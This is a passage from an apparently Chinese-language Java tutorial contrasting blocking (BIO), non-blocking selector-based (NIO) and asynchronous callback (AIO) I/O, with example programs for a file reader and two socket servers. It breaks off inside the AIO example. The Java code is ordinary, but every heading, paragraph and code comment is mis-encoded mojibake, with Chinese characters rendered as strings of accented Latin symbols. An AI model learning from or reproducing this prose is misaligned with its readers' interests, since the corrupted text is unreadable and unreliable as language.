<h3 data-id="heading-9">1. BIOï¼šåŒæ­¥é˜»å¡IOï¼ˆæœ€åŸºç¡€ã€æœ€â€œç¬¨â€ï¼Œæ–°æ‰‹å…¥é—¨é¦–é€‰ï¼‰</h3>
<h4 data-id="heading-10">ï¼ˆ1ï¼‰æ ¸å¿ƒå®šä½</h4>
<p>BIOå…¨ç§°ã€ŒBlocking IOã€ï¼Œå³åŒæ­¥é˜»å¡IOï¼Œæ˜¯Javaæœ€æ—©æœŸçš„IOæ¨¡å‹ï¼Œå¯¹åº”å’±ä»¬å‰é¢è¯´çš„ã€ŒåŒæ­¥é˜»å¡ã€ç»„åˆâ€”â€”ç¨‹åºå‘èµ·IOè¯·æ±‚åï¼ˆç±»ä¼¼çƒ§æ°´ï¼‰ï¼Œå¿…é¡»ç­‰å¾…IOæ“ä½œï¼ˆè¯»/å†™æ•°æ®ï¼‰å®Œå…¨å®Œæˆï¼ŒæœŸé—´çº¿ç¨‹ä¼šè¢«æŒ‚èµ·ï¼Œä»€ä¹ˆéƒ½åšä¸äº†ã€‚</p>
<h4 data-id="heading-11">ï¼ˆ2ï¼‰å®ç°åŸç†</h4>
<p>BIOçš„æ ¸å¿ƒæ˜¯ã€Œ<strong>æµï¼ˆStreamï¼‰</strong>ã€ï¼Œæ•°æ®ä¼ è¾“æ˜¯å•å‘çš„ï¼ˆè¾“å…¥æµè¯»æ•°æ®ã€è¾“å‡ºæµå†™æ•°æ®ï¼‰ï¼Œå°±åƒâ€œä¸€æ ¹å•å‘çš„æ°´ç®¡â€ï¼Œæ°´åªèƒ½ä»ä¸€ç«¯æµåˆ°å¦ä¸€ç«¯ã€‚</p>
<p>å®ç°é€»è¾‘å¾ˆç®€å•ï¼š</p>
<ol>
<li>
<p>ç¨‹åºï¼ˆçº¿ç¨‹ï¼‰å‘èµ·IOè¯·æ±‚ï¼ˆæ¯”å¦‚è¯»å–ä¸€ä¸ªæ–‡ä»¶ã€æ¥æ”¶å®¢æˆ·ç«¯è¿æ¥ï¼‰ï¼›</p>
</li>
<li>
<p>IOæ“ä½œæœªå®Œæˆæ—¶ï¼Œçº¿ç¨‹ä¼šè¢«æ“ä½œç³»ç»ŸæŒ‚èµ·ï¼ˆé˜»å¡çŠ¶æ€ï¼‰ï¼Œæš‚åœæ‰§è¡Œï¼ŒæœŸé—´ä¸èƒ½åšä»»ä½•å…¶ä»–ä»»åŠ¡ï¼›</p>
</li>
<li>
<p>ç›´åˆ°IOæ“ä½œå®Œå…¨å®Œæˆï¼ˆæ•°æ®è¯»å®Œã€è¿æ¥å»ºç«‹ï¼‰ï¼Œçº¿ç¨‹æ‰ä¼šè¢«å”¤é†’ï¼Œç»§ç»­æ‰§è¡Œåç»­ä»£ç ã€‚</p>
</li>
</ol>
<h4 data-id="heading-12">ï¼ˆ3ï¼‰æ ¸å¿ƒç‰¹ç‚¹+å¯¹åº”åœºæ™¯</h4>
<ul>
<li>
<p>ä¼˜ç‚¹ï¼š<strong>ç¼–ç¨‹ç®€å•ã€é€»è¾‘ç›´è§‚</strong>ï¼Œæ–°æ‰‹å®¹æ˜“ä¸Šæ‰‹ï¼Œä¸ç”¨è€ƒè™‘å¤æ‚çš„è½®è¯¢ã€å›è°ƒï¼Œç›´æ¥è°ƒç”¨APIå°±èƒ½å®ç°IOæ“ä½œã€‚</p>
</li>
<li>
<p>ç¼ºç‚¹ï¼š<strong>æ•ˆç‡æä½ã€èµ„æºæµªè´¹ä¸¥é‡</strong>ã€‚ä¸€ä¸ªçº¿ç¨‹åªèƒ½å¤„ç†ä¸€ä¸ªIOè¯·æ±‚ï¼Œé«˜å¹¶å‘åœºæ™¯ä¸‹ï¼ˆæ¯”å¦‚1000ä¸ªå®¢æˆ·ç«¯åŒæ—¶è¿æ¥ï¼‰ï¼Œéœ€è¦åˆ›å»º1000ä¸ªçº¿ç¨‹ï¼Œçº¿ç¨‹åˆ‡æ¢å’ŒæŒ‚èµ·ä¼šæ¶ˆè€—å¤§é‡ç³»ç»Ÿèµ„æºï¼Œç”šè‡³å¯¼è‡´ç¨‹åºå´©æºƒã€‚</p>
</li>
<li>
<p>é€‚ç”¨åœºæ™¯ï¼šä½å¹¶å‘ã€ç®€å•çš„IOæ“ä½œï¼Œæ¯”å¦‚æœ¬åœ°å°æ–‡ä»¶è¯»å†™ã€ç®€å•çš„æ§åˆ¶å°äº¤äº’ï¼Œä¸éœ€è¦è€ƒè™‘é«˜æ€§èƒ½ï¼ˆæ¯”å¦‚å†™ä¸€ä¸ªè¯»å–æœ¬åœ°æ–‡æœ¬æ–‡ä»¶çš„å°å·¥å…·ï¼‰ã€‚</p>
</li>
</ul>
<h4 data-id="heading-13">ï¼ˆ4ï¼‰ç®€å•ä»£ç ç¤ºä¾‹ï¼ˆBIOæ–‡ä»¶è¯»å–ï¼‰</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.io.BufferedReader;
<span class="hljs-keyword">import</span> java.io.FileReader;
<span class="hljs-keyword">import</span> java.io.IOException;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BIOExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// è¯»å–æœ¬åœ°æ–‡ä»¶ï¼ˆåŒæ­¥é˜»å¡ï¼‰</span>
        <span class="hljs-keyword">try</span> (<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">br</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>(<span class="hljs-string">"test.txt"</span>))) {
            String line;
            <span class="hljs-comment">// readLine() æ˜¯é˜»å¡æ–¹æ³•ï¼šæ²¡è¯»åˆ°æ•°æ®/æ–‡ä»¶ç»“æŸå‰ï¼Œçº¿ç¨‹ä¼šä¸€ç›´æŒ‚èµ·</span>
            <span class="hljs-keyword">while</span> ((line = br.readLine()) != <span class="hljs-literal">null</span>) {
                System.out.println(line);
            }
        } <span class="hljs-keyword">catch</span> (IOException e) {
            e.printStackTrace();
        }
    }
}
</code></pre>
<h3 data-id="heading-14">2. NIOï¼šåŒæ­¥éé˜»å¡IOï¼ˆé«˜å¹¶å‘ä¸»æµï¼Œæ€§èƒ½æå‡å…³é”®ï¼‰</h3>
<h4 data-id="heading-15">ï¼ˆ1ï¼‰æ ¸å¿ƒå®šä½</h4>
<p>NIOå…¨ç§°ã€ŒNon-blocking IOã€ï¼Œå³åŒæ­¥éé˜»å¡IOï¼Œæ˜¯JDK 1.4å¼•å…¥çš„IOæ¨¡å‹ï¼Œå¯¹åº”å’±ä»¬å‰é¢è¯´çš„ã€ŒåŒæ­¥éé˜»å¡ã€ç»„åˆâ€”â€”ç¨‹åºå‘èµ·IOè¯·æ±‚åï¼Œ<strong>ä¸ç”¨ç­‰å¾…</strong>IOæ“ä½œå®Œæˆï¼Œçº¿ç¨‹å¯ä»¥å»åšå…¶ä»–ä»»åŠ¡ï¼ŒæœŸé—´ä¸»åŠ¨è½®è¯¢æ£€æŸ¥IOæ“ä½œæ˜¯å¦å®Œæˆã€‚</p>
<p>å®ƒè§£å†³äº†BIOé«˜å¹¶å‘ä¸‹çš„èµ„æºæµªè´¹é—®é¢˜ï¼Œæ˜¯ç›®å‰Javaé«˜å¹¶å‘ç½‘ç»œç¼–ç¨‹çš„ä¸»æµï¼ˆæ¯”å¦‚Nettyæ¡†æ¶ï¼Œå°±æ˜¯åŸºäºNIOå°è£…çš„ï¼‰ã€‚</p>
<h4 data-id="heading-16">ï¼ˆ2ï¼‰å®ç°åŸç†</h4>
<p>NIOçš„æ ¸å¿ƒä¸å†æ˜¯â€œæµâ€ï¼Œè€Œæ˜¯ã€Œé€šé“ï¼ˆChannelï¼‰+ ç¼“å†²åŒºï¼ˆBufferï¼‰+ é€‰æ‹©å™¨ï¼ˆSelectorï¼‰ã€ï¼Œä¸‰è€…ååŒå·¥ä½œï¼Œå®ç°â€œå•çº¿ç¨‹å¤„ç†å¤šä¸ªIOè¯·æ±‚â€ï¼Œä¹Ÿå°±æ˜¯å’±ä»¬å¸¸è¯´çš„ã€ŒIOå¤šè·¯å¤ç”¨ã€ã€‚</p>
<p>æ‹†è§£ä¸‰ä¸ªæ ¸å¿ƒç»„ä»¶ï¼Œé€šä¿—æ˜“æ‡‚ï¼š</p>
<ul>
<li>
<p><strong>é€šé“ï¼ˆChannelï¼‰</strong>ï¼šåŒå‘çš„â€œæ°´ç®¡â€ï¼Œæ›¿ä»£BIOçš„å•å‘æµï¼Œæ•°æ®å¯ä»¥åŒå‘ä¼ è¾“ï¼ˆæ—¢èƒ½è¯»åˆèƒ½å†™ï¼‰ï¼Œæ¯”å¦‚æ–‡ä»¶é€šé“ï¼ˆFileChannelï¼‰ã€ç½‘ç»œé€šé“ï¼ˆSocketChannelï¼‰ã€‚</p>
</li>
<li>
<p><strong>ç¼“å†²åŒºï¼ˆBufferï¼‰</strong>ï¼šæ•°æ®çš„â€œå®¹å™¨â€ï¼Œæ‰€æœ‰IOæ“ä½œéƒ½é€šè¿‡Bufferå®Œæˆï¼ˆè¯»æ•°æ®ï¼šä»é€šé“è¯»åˆ°ç¼“å†²åŒºï¼›å†™æ•°æ®ï¼šä»ç¼“å†²åŒºå†™åˆ°é€šé“ï¼‰ï¼Œé¿å…é¢‘ç¹æ“ä½œåº•å±‚èµ„æºï¼Œæå‡æ•ˆç‡ã€‚</p>
</li>
<li>
<p><strong>é€‰æ‹©å™¨ï¼ˆSelectorï¼‰</strong>ï¼šNIOçš„æ ¸å¿ƒï¼Œç›¸å½“äºâ€œä¸€ä¸ªè°ƒåº¦å‘˜â€ã€‚å•çº¿ç¨‹å¯ä»¥é€šè¿‡Selectorï¼ŒåŒæ—¶ç®¡ç†å¤šä¸ªé€šé“ï¼Œç›‘å¬é€šé“ä¸Šçš„IOäº‹ä»¶ï¼ˆæ¯”å¦‚â€œæœ‰æ•°æ®å¯è¯»â€â€œæœ‰å®¢æˆ·ç«¯è¿æ¥â€ï¼‰ï¼›çº¿ç¨‹ä¸ç”¨é˜»å¡ç­‰å¾…æ¯ä¸ªé€šé“çš„IOå®Œæˆï¼Œè€Œæ˜¯ç”±Selectoré€šçŸ¥çº¿ç¨‹â€œå“ªä¸ªé€šé“çš„IOå‡†å¤‡å¥½äº†â€ï¼Œçº¿ç¨‹å†å»å¤„ç†å¯¹åº”çš„é€šé“ã€‚</p>
</li>
</ul>
<p>å®ç°é€»è¾‘æ€»ç»“ï¼š</p>
<ol>
<li>
<p>åˆ›å»ºé€šé“ï¼Œå¹¶è®¾ç½®ä¸ºéé˜»å¡æ¨¡å¼ï¼›</p>
</li>
<li>
<p>å°†æ‰€æœ‰é€šé“æ³¨å†Œåˆ°Selectorä¸Šï¼ŒæŒ‡å®šè¦ç›‘å¬çš„IOäº‹ä»¶ï¼›</p>
</li>
<li>
<p>çº¿ç¨‹é€šè¿‡Selectorè½®è¯¢ï¼ˆéé˜»å¡ï¼‰ï¼Œæ£€æŸ¥æ˜¯å¦æœ‰é€šé“çš„IOäº‹ä»¶å°±ç»ªï¼›</p>
</li>
<li>
<p>å¦‚æœæœ‰å°±ç»ªçš„é€šé“ï¼Œçº¿ç¨‹å°±å»å¤„ç†å¯¹åº”çš„IOæ“ä½œï¼ˆè¯»/å†™æ•°æ®ï¼‰ï¼›å¦‚æœæ²¡æœ‰ï¼Œçº¿ç¨‹å¯ä»¥å»åšå…¶ä»–ä»»åŠ¡ï¼Œè¿‡ä¼šå„¿å†è½®è¯¢ã€‚</p>
</li>
</ol>
<h4 data-id="heading-17">ï¼ˆ3ï¼‰æ ¸å¿ƒç‰¹ç‚¹+å¯¹åº”åœºæ™¯</h4>
<ul>
<li>
<p>ä¼˜ç‚¹ï¼š<strong>é«˜å¹¶å‘æ€§èƒ½ä¼˜ç§€</strong>ï¼Œå•çº¿ç¨‹å¯å¤„ç†å¤šä¸ªIOè¯·æ±‚ï¼Œå‡å°‘çº¿ç¨‹åˆ›å»ºå’Œåˆ‡æ¢çš„å¼€é”€ï¼›èµ„æºåˆ©ç”¨ç‡é«˜ï¼Œçº¿ç¨‹ä¸ç”¨å‚»ç­‰ï¼Œå¯å¹¶è¡Œå¤„ç†å…¶ä»–ä»»åŠ¡ã€‚</p>
</li>
<li>
<p>ç¼ºç‚¹ï¼šç¼–ç¨‹å¤æ‚åº¦æ¯”BIOé«˜ï¼Œéœ€è¦ç†è§£Channelã€Bufferã€Selectorçš„ååŒå·¥ä½œæœºåˆ¶ï¼›è½®è¯¢æ“ä½œä¼šæ¶ˆè€—ä¸€å®šçš„CPUèµ„æºï¼ˆä½†æ¯”BIOçš„çº¿ç¨‹é˜»å¡å¥½å¾—å¤šï¼‰ã€‚</p>
</li>
<li>
<p>é€‚ç”¨åœºæ™¯ï¼šé«˜å¹¶å‘ç½‘ç»œç¼–ç¨‹ï¼Œæ¯”å¦‚æœåŠ¡å™¨ã€ç½‘å…³ã€èŠå¤©æœåŠ¡å™¨ç­‰ï¼Œéœ€è¦å¤„ç†å¤§é‡è¿æ¥ï¼Œä½†æ¯ä¸ªè¿æ¥çš„æ•°æ®é‡ä¸å¤§çš„åœºæ™¯ã€‚</p>
</li>
</ul>
<h4 data-id="heading-18">ï¼ˆ4ï¼‰ç®€å•ä»£ç ç¤ºä¾‹ï¼ˆNIO Socket æœåŠ¡ç«¯ï¼Œå¤šè·¯å¤ç”¨ï¼‰</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.net.InetSocketAddress;
<span class="hljs-keyword">import</span> java.nio.ByteBuffer;
<span class="hljs-keyword">import</span> java.nio.channels.SelectionKey;
<span class="hljs-keyword">import</span> java.nio.channels.Selector;
<span class="hljs-keyword">import</span> java.nio.channels.ServerSocketChannel;
<span class="hljs-keyword">import</span> java.nio.channels.SocketChannel;
<span class="hljs-keyword">import</span> java.util.Iterator;
<span class="hljs-keyword">import</span> java.util.Set;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NIOExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-comment">// 1. åˆ›å»º ServerSocketChannel å¹¶è®¾ç½®ä¸ºéé˜»å¡</span>
        <span class="hljs-type">ServerSocketChannel</span> <span class="hljs-variable">serverChannel</span> <span class="hljs-operator">=</span> ServerSocketChannel.open();
        serverChannel.bind(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InetSocketAddress</span>(<span class="hljs-number">8888</span>));
        serverChannel.configureBlocking(<span class="hljs-literal">false</span>); <span class="hljs-comment">// å…³é”®ï¼šè®¾ç½®éé˜»å¡</span>

        <span class="hljs-comment">// 2. åˆ›å»º Selectorï¼ˆé€‰æ‹©å™¨ï¼‰</span>
        <span class="hljs-type">Selector</span> <span class="hljs-variable">selector</span> <span class="hljs-operator">=</span> Selector.open();
        <span class="hljs-comment">// 3. å°† ServerSocketChannel æ³¨å†Œåˆ° Selectorï¼Œç›‘å¬â€œè¿æ¥äº‹ä»¶â€</span>
        serverChannel.register(selector, SelectionKey.OP_ACCEPT);
        System.out.println(<span class="hljs-string">"NIO æœåŠ¡ç«¯å¯åŠ¨ï¼Œç›‘å¬ç«¯å£ï¼š8888"</span>);

        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
            <span class="hljs-comment">// 4. è½®è¯¢å°±ç»ªçš„ Channelï¼ˆé˜»å¡ï¼Œç›´åˆ°æœ‰äº‹ä»¶å‘ç”Ÿï¼‰</span>
            selector.select();
            <span class="hljs-comment">// 5. è·å–æ‰€æœ‰å°±ç»ªçš„ SelectionKey</span>
            Set&lt;SelectionKey&gt; selectedKeys = selector.selectedKeys();
            Iterator&lt;SelectionKey&gt; iterator = selectedKeys.iterator();

            <span class="hljs-keyword">while</span> (iterator.hasNext()) {
                <span class="hljs-type">SelectionKey</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> iterator.next();
                iterator.remove(); <span class="hljs-comment">// å¿…é¡»ç§»é™¤ï¼Œé¿å…é‡å¤å¤„ç†</span>

                <span class="hljs-comment">// 6. å¤„ç†ä¸åŒäº‹ä»¶</span>
                <span class="hljs-keyword">if</span> (key.isAcceptable()) {
                    <span class="hljs-comment">// å¤„ç†è¿æ¥äº‹ä»¶</span>
                    <span class="hljs-type">ServerSocketChannel</span> <span class="hljs-variable">ssc</span> <span class="hljs-operator">=</span> (ServerSocketChannel) key.channel();
                    <span class="hljs-type">SocketChannel</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> ssc.accept(); <span class="hljs-comment">// éé˜»å¡ï¼Œä¸ä¼šæŒ‚èµ·</span>
                    sc.configureBlocking(<span class="hljs-literal">false</span>);
                    <span class="hljs-comment">// æ³¨å†Œè¯»äº‹ä»¶</span>
                    sc.register(selector, SelectionKey.OP_READ, ByteBuffer.allocate(<span class="hljs-number">1024</span>));
                    System.out.println(<span class="hljs-string">"å®¢æˆ·ç«¯è¿æ¥æˆåŠŸï¼š"</span> + sc.getRemoteAddress());
                } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (key.isReadable()) {
                    <span class="hljs-comment">// å¤„ç†è¯»äº‹ä»¶</span>
                    <span class="hljs-type">SocketChannel</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> (SocketChannel) key.channel();
                    <span class="hljs-type">ByteBuffer</span> <span class="hljs-variable">buffer</span> <span class="hljs-operator">=</span> (ByteBuffer) key.attachment();
                    <span class="hljs-type">int</span> <span class="hljs-variable">read</span> <span class="hljs-operator">=</span> sc.read(buffer); <span class="hljs-comment">// éé˜»å¡ï¼Œè¿”å›è¯»å–çš„å­—èŠ‚æ•°</span>
                    <span class="hljs-keyword">if</span> (read &gt; <span class="hljs-number">0</span>) {
                        buffer.flip();
                        <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(buffer.array(), <span class="hljs-number">0</span>, buffer.limit());
                        System.out.println(<span class="hljs-string">"æ”¶åˆ°å®¢æˆ·ç«¯æ¶ˆæ¯ï¼š"</span> + msg);
                        buffer.clear();
                    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (read &lt; <span class="hljs-number">0</span>) {
                        <span class="hljs-comment">// å®¢æˆ·ç«¯æ–­å¼€è¿æ¥</span>
                        sc.close();
                        key.cancel();
                        System.out.println(<span class="hljs-string">"å®¢æˆ·ç«¯æ–­å¼€è¿æ¥ï¼š"</span> + sc.getRemoteAddress());
                    }
                }
            }
        }
    }
}
</code></pre>
<h3 data-id="heading-19">3. AIOï¼šå¼‚æ­¥éé˜»å¡IOï¼ˆé«˜æ€§èƒ½å¤©èŠ±æ¿ï¼Œåœºæ™¯å—é™ï¼‰</h3>
<h4 data-id="heading-20">ï¼ˆ1ï¼‰æ ¸å¿ƒå®šä½</h4>
<p>AIOå…¨ç§°ã€ŒAsynchronous IOã€ï¼Œå³å¼‚æ­¥éé˜»å¡IOï¼Œæ˜¯JDK 1.7å¼•å…¥çš„IOæ¨¡å‹ï¼ˆä¹Ÿå«NIO.2ï¼‰ï¼Œå¯¹åº”å’±ä»¬å‰é¢è¯´çš„ã€Œå¼‚æ­¥éé˜»å¡ã€ç»„åˆâ€”â€”ç¨‹åºå‘èµ·IOè¯·æ±‚åï¼Œç›´æ¥è¿”å›ï¼Œ<strong>ä¸ç”¨ç­‰å¾…ã€ä¸ç”¨è½®è¯¢</strong>ï¼ŒIOæ“ä½œç”±æ“ä½œç³»ç»Ÿå¼‚æ­¥å®Œæˆï¼›å½“IOæ“ä½œå®Œæˆåï¼Œæ“ä½œç³»ç»Ÿä¼šé€šè¿‡ã€Œå›è°ƒå‡½æ•°ã€æˆ–ã€ŒFutureã€é€šçŸ¥ç¨‹åºï¼Œç¨‹åºå†å»å¤„ç†ç»“æœã€‚</p>
<p><strong>å®ƒæ˜¯ä¸‰è€…ä¸­æ•ˆç‡æœ€é«˜çš„ï¼Œä½†å—æ“ä½œç³»ç»Ÿæ”¯æŒé™åˆ¶ï¼Œå®é™…åº”ç”¨ä¸å¦‚NIOå¹¿æ³›ã€‚</strong></p>
<h4 data-id="heading-21">ï¼ˆ2ï¼‰å®ç°åŸç†</h4>
<p>AIOçš„æ ¸å¿ƒæ˜¯ã€Œå¼‚æ­¥å›è°ƒã€ï¼Œç¨‹åºå®Œå…¨ä¸ç”¨å…³å¿ƒIOæ“ä½œçš„è¿‡ç¨‹ï¼Œåªéœ€è¦å‘èµ·è¯·æ±‚ã€æ³¨å†Œå›è°ƒï¼Œå‰©ä¸‹çš„éƒ½äº¤ç»™æ“ä½œç³»ç»Ÿå¤„ç†ï¼Œç›¸å½“äºâ€œç”©æ‰‹æŒæŸœâ€ã€‚</p>
<p>å®ç°é€»è¾‘å¾ˆç®€å•ï¼Œåˆ†ä¸º3æ­¥ï¼š</p>
<ol>
<li>
<p>ç¨‹åºï¼ˆçº¿ç¨‹ï¼‰å‘èµ·IOè¯·æ±‚ï¼ˆæ¯”å¦‚è¯»å–å¤§æ–‡ä»¶ã€æ¥æ”¶å®¢æˆ·ç«¯è¿æ¥ï¼‰ï¼Œå¹¶æ³¨å†Œä¸€ä¸ªã€Œå›è°ƒå‡½æ•°ã€ï¼›</p>
</li>
<li>
<p>è¯·æ±‚å‘èµ·åï¼Œçº¿ç¨‹ç«‹å³è¿”å›ï¼Œç»§ç»­æ‰§è¡Œå…¶ä»–ä»»åŠ¡ï¼ˆéé˜»å¡ï¼‰ï¼ŒIOæ“ä½œç”±æ“ä½œç³»ç»Ÿåœ¨åå°å¼‚æ­¥å®Œæˆï¼›</p>
</li>
<li>
<p>å½“IOæ“ä½œå®Œæˆï¼ˆæ•°æ®è¯»å®Œã€è¿æ¥å»ºç«‹ï¼‰ï¼Œæ“ä½œç³»ç»Ÿä¼šè‡ªåŠ¨è°ƒç”¨æ³¨å†Œçš„å›è°ƒå‡½æ•°ï¼Œé€šçŸ¥ç¨‹åºâ€œIOæ“ä½œå®Œæˆâ€ï¼Œç¨‹åºå†åœ¨å›è°ƒå‡½æ•°ä¸­å¤„ç†è¿”å›çš„æ•°æ®ã€‚</p>
</li>
</ol>
<p>å…³é”®åŒºåˆ«ï¼š<strong>NIOæ˜¯ã€Œç¨‹åºä¸»åŠ¨è½®è¯¢ã€æ£€æŸ¥IOæ˜¯å¦å®Œæˆï¼Œè€ŒAIOæ˜¯ã€Œæ“ä½œç³»ç»Ÿè¢«åŠ¨é€šçŸ¥ã€</strong>ï¼Œç¨‹åºä¸ç”¨åšä»»ä½•ç­‰å¾…å’Œè½®è¯¢ï¼Œèµ„æºåˆ©ç”¨ç‡è¾¾åˆ°æœ€é«˜ã€‚</p>
<h4 data-id="heading-22">ï¼ˆ3ï¼‰æ ¸å¿ƒç‰¹ç‚¹+å¯¹åº”åœºæ™¯</h4>
<ul>
<li>
<p>ä¼˜ç‚¹ï¼š<strong>æ€§èƒ½æœ€ä¼˜</strong>ï¼Œå…¨ç¨‹éé˜»å¡ï¼Œçº¿ç¨‹ä¸ç”¨ç­‰å¾…ã€ä¸ç”¨è½®è¯¢ï¼Œå®Œå…¨è§£æ”¾çº¿ç¨‹ï¼›é€‚åˆå¤„ç†å¤§æ•°æ®é‡ã€é«˜å»¶è¿Ÿçš„IOæ“ä½œã€‚</p>
</li>
<li>
<p>ç¼ºç‚¹ï¼šç¼–ç¨‹å¤æ‚åº¦æœ€é«˜ï¼Œéœ€è¦ç†è§£å¼‚æ­¥å›è°ƒã€Futureç­‰æœºåˆ¶ï¼›å—æ“ä½œç³»ç»Ÿæ”¯æŒé™åˆ¶ï¼ˆWindowsç³»ç»Ÿå¯¹AIOæ”¯æŒè¾ƒå¥½ï¼ŒLinuxç³»ç»Ÿå¯¹AIOæ”¯æŒæœ‰é™ï¼Œå®é™…å¼€å‘ä¸­å¸¸ç”¨NIOæ›¿ä»£ï¼‰ã€‚</p>
</li>
<li>
<p>é€‚ç”¨åœºæ™¯ï¼šé«˜å¹¶å‘ã€å¤§æ•°æ®é‡ã€ä½å»¶è¿Ÿçš„IOåœºæ™¯ï¼Œæ¯”å¦‚å¤§æ–‡ä»¶ä¼ è¾“ã€è§†é¢‘æµå¤„ç†ã€é«˜æ€§èƒ½æœåŠ¡å™¨ç­‰ï¼Œä¸”æ“ä½œç³»ç»Ÿæ”¯æŒå¼‚æ­¥IOçš„åœºæ™¯ã€‚</p>
</li>
</ul>
<h4 data-id="heading-23">ï¼ˆ4ï¼‰ç®€å•ä»£ç ç¤ºä¾‹ï¼ˆAIOå¼‚æ­¥å›è°ƒï¼‰</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.net.InetSocketAddress;
<span class="hljs-keyword">import</span> java.nio.ByteBuffer;
<span class="hljs-keyword">import</span> java.nio.channels.AsynchronousServerSocketChannel;
<span class="hljs-keyword">import</span> java.nio.channels.AsynchronousSocketChannel;
<span class="hljs-keyword">import</span> java.nio.channels.CompletionHandler;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AIOExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-comment">// 1. åˆ›å»ºå¼‚æ­¥æœåŠ¡ç«¯é€šé“</span>
        <span class="hljs-type">AsynchronousServerSocketChannel</span> <span class="hljs-variable">serverChannel</span> <span class="hljs-operator">=</span> AsynchronousServerSocketChannel.open();
        serverChannel.bind(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InetSocketAddress</span>(<span class="hljs-number">8888</span>));
        System.out.println(<span class="hljs-string">"AIOæœåŠ¡ç«¯å¯åŠ¨ï¼Œç›‘å¬ç«¯å£8888..."</span>);

        <span class="hljs-comment">// 2. å¼‚æ­¥æ¥å—è¿æ¥ï¼ˆæ³¨å†Œå›è°ƒå‡½æ•°ï¼ŒIOå®Œæˆåè‡ªåŠ¨è§¦å‘ï¼‰</span>
        serverChannel.accept(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CompletionHandler</span>&lt;AsynchronousSocketChannel, Void&gt;() {
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">completed</span><span class="hljs-params">(AsynchronousSocketChannel sc, Void attachment)</span> {
                <span class="hljs-comment">// ç»§ç»­æ¥å—ä¸‹ä¸€ä¸ªå®¢æˆ·ç«¯è¿æ¥ï¼ˆå¦åˆ™åªèƒ½å¤„ç†ä¸€ä¸ªå®¢æˆ·ç«¯ï¼‰</span>
                serverChannel.accept(<span class="hljs-literal">null</span>, <span class="hljs-built_in">this</span>);
                System.out.println(<span class="hljs-string">"å®¢æˆ·ç«¯è¿æ¥æˆåŠŸï¼š"</span> + sc);

                <span class="hljs-comment">// 3. å¼‚æ­¥è¯»å–å®¢æˆ·ç«¯æ•°æ®ï¼ˆæ³¨å†Œå›è°ƒï¼‰</span>
                <span class="hljs-type">ByteBuffer</span> <span class="hljs-variable">buffer</span> <span class="hljs-operator">=</span> ByteBuffer.allocate(<span class="hljs-number">1024</span>);
                sc.read(buffer, buffer, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CompletionHandler</span>&lt;Integer, ByteBuffer&gt;() {
                    <span class="hljs-meta">@Override</span>
                    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">completed</span><span class="hljs-params">(Integer readBytes, ByteBuffer buf)</span> {
                        <span class="hljs-comment">// IOæ“ä½œå®Œæˆï¼ˆè¯»å–åˆ°æ•°æ®ï¼‰ï¼Œå¤„ç†æ•°æ®</span>
                        <span class="hljs-keyword">if</span> (readBytes &gt; <span class="hljs-number">0</span>) {
                            buf.flip();
                            <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(buf.array(), <span class="hljs-number">0</span>, readBytes);
                            System.out.println(<span class="hljs-string">"æ”¶åˆ°å®¢æˆ·ç«¯æ¶ˆæ¯ï¼š"</span> + msg);
                            <span class="hljs-comment">// ç»§ç»­è¯»å–ä¸‹ä¸€æ¬¡æ•°æ®</span>
                            sc.read(buf, buf, <span class="hljs-built_in">this</span>);
                        }
                    }

                    <span class="hljs-meta">@Override</span>
                    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">failed</span><span class="hljs-params">(Throwable exc, ByteBuffer buf)</span> {
                        <span class="hljs-comment">// IOæ“ä½œå¤±è´¥ï¼Œå¤„ç†å¼‚å¸¸</span>
                        exc.printStackTrace();
                    }
                });
            }

            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">failed</span><span class="hljs-params">(Throwable exc, Void attachment)</span> {
                <span class="hljs-comment">// è¿æ¥å¤±è´¥ï¼Œå¤„ç†å¼‚å¸¸</span>
                exc.printStackTrace();
            }
        });

